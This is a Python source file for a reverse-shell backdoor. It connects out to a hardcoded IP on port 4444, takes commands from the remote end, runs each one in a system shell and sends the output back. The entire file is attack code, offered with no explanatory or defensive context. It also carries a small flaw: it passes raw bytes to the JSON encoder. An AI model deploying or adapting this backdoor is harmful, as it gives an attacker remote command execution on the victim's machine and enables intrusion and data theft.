
import socket 
import subprocess 
import json


class Backdoor:
    
    def __init__(self,ip,port):
        # sourcery skip: replace-interpolation-with-fstring
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        
        
    def shell_exec(self, command):
        return subprocess.check_output(command, shell=True)
    
    def send_data(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        
    def recv_data(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode('utf8','ignore')
                return json.loads(json_data)
            except ValueError:
                continue
    
    def run(self):
        while True:
            command = self.recv_data()
            result_command = self.shell_exec(command)
            self.send_data(result_command)
            
        self.connection.close()


back = Backdoor("192.168.43.52",4444)
back.run()